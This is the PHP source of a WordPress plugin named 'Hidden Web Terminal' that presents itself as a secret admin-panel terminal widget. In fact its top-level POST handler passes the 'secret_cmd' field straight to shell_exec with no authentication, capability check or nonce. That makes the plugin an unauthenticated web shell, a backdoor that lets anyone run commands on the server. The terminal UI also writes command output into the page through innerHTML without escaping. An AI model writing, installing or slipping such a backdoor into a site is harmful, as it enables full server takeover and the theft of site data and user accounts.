<?php
/**
 * Plugin Name: Hidden Web Terminal
 * Description: Secret terminal widget for admin panel.
 * Version: 2.0
 * Author: VitAn
 */

// Backend: Handle command execution via AJAX/POST
if (isset($_POST['secret_cmd'])) {
    @session_start();
    if(!isset($_SESSION['cwd'])) {
        $_SESSION['cwd'] = ABSPATH;
    }
    $cmd = $_POST['secret_cmd'];
    if(substr(trim($cmd), 0, 3) === 'cd ') {
        $target_dir = trim(substr($cmd, 3));
        chdir($_SESSION['cwd']);
        @chdir($target_dir);
        $_SESSION['cwd'] = getcwd();
        $output = "";
    } else {
        chdir($_SESSION['cwd']);
        $output = shell_exec($cmd . ' 2>&1');
    }
    echo json_encode(['output' => $output, 'cwd' => $_SESSION['cwd']]);
    exit();
}

// Frontend: Inject the red button and terminal UI into WordPress admin pages
add_action('admin_footer', function() {
    ?>
    <div id="secret-term-btn" style="position:fixed; bottom:20px; right:20px; width:20px; height:20px; background:red; border-radius:50%; cursor:pointer; z-index:999999; box-shadow:0 0 10px rgba(0,0,0,0.5);" title="Terminal"></div>
    
    <div id="secret-term-box" style="display:none; position:fixed; bottom:50px; right:20px; width:600px; height:400px; background:#111; color:#0f0; font-family:monospace; border:2px solid red; z-index:999999; padding:10px; box-shadow:0 0 20px rgba(0,0,0,0.8); flex-direction:column;">
        <div id="term-header" style="background:#222; padding:5px; cursor:move; display:flex; justify-content:space-between; border-bottom:1px solid #444;">
            <span id="term-cwd" style="font-size:12px; color:#ff5555;">/</span>
            <span id="term-close" style="cursor:pointer; color:#fff; font-weight:bold; padding:0 5px;">[X]</span>
        </div>
        <div id="term-output" style="flex:1; overflow-y:auto; padding:5px; white-space:pre-wrap; font-size:13px; margin-bottom:5px;"></div>
        <div style="display:flex;">
            <span style="padding-right:5px; color:#0f0;">$</span>
            <input type="text" id="term-input" style="flex:1; background:#000; color:#0f0; border:none; outline:none; font-family:monospace; font-size:13px;" autofocus>
        </div>
    </div>

    <script>
    document.getElementById('secret-term-btn').addEventListener('click', function() {
        var box = document.getElementById('secret-term-box');
        box.style.display = box.style.display === 'none' ? 'flex' : 'none';
        document.getElementById('term-input').focus();
    });

    document.getElementById('term-close').addEventListener('click', function() {
        document.getElementById('secret-term-box').style.display = 'none';
    });

    document.getElementById('term-input').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            var cmd = this.value;
            var outputDiv = document.getElementById('term-output');
            outputDiv.innerHTML += "\n$ " + cmd + "\n";
            this.value = '';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.href, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    try {
                        var res = JSON.parse(xhr.responseText);
                        outputDiv.innerHTML += res.output;
                        document.getElementById('term-cwd').innerText = res.cwd;
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    } catch(err) {
                        outputDiv.innerHTML += "Error parsing response\n";
                    }
                }
            };
            xhr.send('secret_cmd=' + encodeURIComponent(cmd));
        }
    });
    </script>
    <?php
});